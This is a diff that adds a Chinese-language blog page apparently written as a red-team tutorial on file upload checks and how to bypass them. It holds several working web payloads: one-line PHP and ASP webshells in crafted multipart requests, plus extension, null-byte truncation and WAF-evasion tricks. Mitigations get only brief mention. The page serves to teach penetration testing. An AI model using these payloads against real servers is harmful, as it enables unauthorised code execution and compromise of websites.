@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-3232cloud.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-1616cloud.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/cloud.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Red Team,前渗透," />
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传与绕过方式">
+<meta property="og:url" content="http://sunyyer.com/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="云">
+<meta property="og:locale">
+<meta property="og:image" content="https://s2.loli.net/2022/01/08/KkJdxj19Ma4YXIt.png">
+<meta property="article:published_time" content="2021-01-08T04:11:11.000Z">
+<meta property="article:modified_time" content="2022-01-08T08:39:44.696Z">
+<meta property="article:author" content="sunyyer">
+<meta property="article:tag" content="Red Team">
+<meta property="article:tag" content="前渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/01/08/KkJdxj19Ma4YXIt.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sunyyer.com/2021/01/08/文件上传与绕过/"/>
+
+
+
+
+
+  <title>文件上传与绕过方式 | 云</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">云</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">雨声潺潺,像住在溪边,宁愿天天下雨,以为你是下雨不来</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="云">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件上传与绕过方式</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-08T12:11:11+08:00">
+                2021-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">技术</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF/%E6%94%BB%E5%87%BB/" itemprop="url" rel="index">
+                    <span itemprop="name">攻击</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://s2.loli.net/2022/01/08/KkJdxj19Ma4YXIt.png" alt="bizhi.png"></p>
+<span id="more"></span>
+
+<h1 id="文件上传校验方式"><a href="#文件上传校验方式" class="headerlink" title="文件上传校验方式"></a>文件上传校验方式</h1><ul>
+<li>客户端javascript校验（一般只校验后缀名）</li>
+<li>服务端校验<ul>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>网页上写一段js脚本，校验上传文件后缀名，黑白名单形式都有。</p>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>在浏览加载文件，但<strong>还未点击上传按钮时便弹出对话框</strong>，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，<strong>而此时并没有发送数据包</strong>。</p>
+<h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="centent-type字段校验"><a href="#centent-type字段校验" class="headerlink" title="centent-type字段校验"></a>centent-type字段校验</h3><p>以PHP为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] != &quot;image/gif&quot;) #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Sorry, we only allow uploading GIF images&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = &#x27;uploads/&#x27;;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;]);</span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;], $uploadfile))</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h2><p>　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p>
+<ol>
+<li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
+<li>.gif，”GIF 89A”</li>
+<li>.zip，”Zip Compressed”</li>
+<li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
+</ol>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><ul>
+<li>客户端绕过（抓包改包）</li>
+<li>服务端绕过<ul>
+<li>文件类型</li>
+<li>文件头</li>
+<li>文件后缀名</li>
+</ul>
+</li>
+<li>配合文件包含漏洞绕过</li>
+<li>配合服务器解析漏洞绕过</li>
+<li>CMS、编辑器漏洞绕过</li>
+<li>配合操作系统文件命名规则绕过</li>
+<li>配合其他规则绕过</li>
+<li>W-AF绕过</li>
+</ul>
+<h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><p>利用burp改包通过，先上传一个允许格式，然后将其改为可执行文件后缀名即可。</p>
+<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>通过改包，将content-type字段改为可用格式，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">TE: deflate,gzip;q=0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/5.803</span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</span><br><span class="line">&lt;?php system($_GET[&#x27;command&#x27;]);?&gt;</span><br><span class="line">--xYzZY</span><br></pre></td></tr></table></figure>
+<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在上传文件的名字前后加一些文件信息，如：<code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p>
+<h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p><strong>大前提：必须是黑名单校验</strong><br>黑名单检测一般会有一个专门的blacklist文件，里面会包含常见的危险脚本文件。</p>
+<p>绕过方法：</p>
+<ol>
+<li>尝试寻找黑名单之外的后缀，比如asa,cer等。</li>
+<li>大小写绕过漏洞等。</li>
+<li>能被解析的文件扩展名列表：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure>
+<h3 id="配合文件包含漏洞绕过"><a href="#配合文件包含漏洞绕过" class="headerlink" title="配合文件包含漏洞绕过"></a>配合文件包含漏洞绕过</h3><p>大前提：只校验当前文件后缀名为asp/php等文件内容是否为木马。<br>绕过方法：</p>
+<ol>
+<li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li>
+<li>举例再上传一个php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code><br>此时php就会引用txt文件的内容从而绕过校验，如：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#PHP</span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt;</span><br><span class="line">#ASP</span><br><span class="line">&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP</span><br><span class="line">&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;</span><br><span class="line">or</span><br><span class="line">&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h3><ol>
+<li>上传不符合windows文件命名规则的文件名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">　　test.asp(空格)</span><br><span class="line">　　test.php:1.jpg</span><br><span class="line">　　test.php::$DATA</span><br><span class="line">　　shell.php::$DATA…….</span><br></pre></td></tr></table></figure>
+
+<p>会被windows系统自动去掉不符合规则符号后面的内容。<br>2. linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
+<h3 id="针对CMS和编辑器绕过"><a href="#针对CMS和编辑器绕过" class="headerlink" title="针对CMS和编辑器绕过"></a>针对CMS和编辑器绕过</h3><p>各种CMS和编辑器(如FCK,ewebeditor)等，漏洞各不相同。</p>
+<h3 id="0x00截断：基于一个组合逻辑漏洞造成，通常存在于构造上传文件路径的时候"><a href="#0x00截断：基于一个组合逻辑漏洞造成，通常存在于构造上传文件路径的时候" class="headerlink" title="0x00截断：基于一个组合逻辑漏洞造成，通常存在于构造上传文件路径的时候"></a>0x00截断：基于一个组合逻辑漏洞造成，通常存在于构造上传文件路径的时候</h3><p><code>　　test.php(0x00).jpg 　　test.php%00.jpg 　　</code></p>
+<p>假设路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span><br><span class="line">type =gettype(name) //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span><br><span class="line">if(type == jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00 作为文件名截断</span><br><span class="line">//最后以 help.asp 存入路径里</span><br></pre></td></tr></table></figure>
+<h3 id="过WAF"><a href="#过WAF" class="headerlink" title="过WAF"></a>过WAF</h3><h4 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h4><p>　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
+<h4 id="POST-GET互相改"><a href="#POST-GET互相改" class="headerlink" title="POST/GET互相改"></a>POST/GET互相改</h4><p>比如把POST型数据包改成GET。</p>
+<h4 id="删除实体中的Content-Type字段"><a href="#删除实体中的Content-Type字段" class="headerlink" title="删除实体中的Content-Type字段"></a>删除实体中的Content-Type字段</h4><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type:image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h4><p>增加一个空格导致安全狗被绕过案列：<br><code>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099</code><br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br><code>boundary= —————————47146314211411730218525550</code></p>
+<h4 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099</span><br><span class="line">Content-Length: 253</span><br><span class="line">-----------------------------4714631421141173021852555099</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br><span class="line">-----------------------------4714631421141173021852555099--</span><br></pre></td></tr></table></figure>
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ul>
+<li>文件扩展名服务器白名单校验</li>
+<li>文件内容服务端校验</li>
+<li>上传文件重命名</li>
+<li>隐藏上传文件路径</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    sunyyer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://sunyyer.com/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/" title="文件上传与绕过方式">http://sunyyer.com/2021/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E7%BB%95%E8%BF%87/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Red-Team/" rel="tag"># Red Team</a>
+          
+            <a href="/tags/%E5%89%8D%E6%B8%97%E9%80%8F/" rel="tag"># 前渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/03/%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="next" title="登录注册页面渗透测试">
+                <i class="fa fa-chevron-left"></i> 登录注册页面渗透测试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/08/Inotifywait/" rel="prev" title="Inotifywait">
+                Inotifywait <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A0%A1%E9%AA%8C%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">文件上传校验方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.1.</span> <span class="nav-text">客户端校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD"><span class="nav-number">1.1.1.</span> <span class="nav-text">判断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.2.</span> <span class="nav-text">服务端校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#centent-type%E5%AD%97%E6%AE%B5%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.2.1.</span> <span class="nav-text">centent-type字段校验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.3.</span> <span class="nav-text">文件头校验</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">客户端绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">服务端绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.1.</span> <span class="nav-text">文件类型绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.2.</span> <span class="nav-text">文件头绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.3.</span> <span class="nav-text">文件后缀名绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.4.</span> <span class="nav-text">配合文件包含漏洞绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E5%90%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E8%A7%84%E5%88%99"><span class="nav-number">2.2.5.</span> <span class="nav-text">配合操作系统文件命令规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9CMS%E5%92%8C%E7%BC%96%E8%BE%91%E5%99%A8%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.6.</span> <span class="nav-text">针对CMS和编辑器绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00%E6%88%AA%E6%96%AD%EF%BC%9A%E5%9F%BA%E4%BA%8E%E4%B8%80%E4%B8%AA%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%EF%BC%8C%E9%80%9A%E5%B8%B8%E5%AD%98%E5%9C%A8%E4%BA%8E%E6%9E%84%E9%80%A0%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E6%97%B6%E5%80%99"><span class="nav-number">2.2.7.</span> <span class="nav-text">0x00截断：基于一个组合逻辑漏洞造成，通常存在于构造上传文件路径的时候</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87WAF"><span 